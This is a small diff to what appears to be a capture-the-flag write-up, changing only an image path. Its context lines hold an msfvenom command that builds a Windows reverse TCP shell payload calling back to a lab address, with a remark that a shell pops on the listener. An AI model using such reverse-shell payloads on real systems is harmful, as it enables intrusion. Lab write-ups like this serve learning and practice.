@@ -28,7 +28,7 @@ msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=10.10.16.5
 
 Then, we can run the script and a shell would pop on our listener port.
 
-<figure><img src="../../../.gitbook/assets/image (3) (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (3) (3) (4).png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation
 
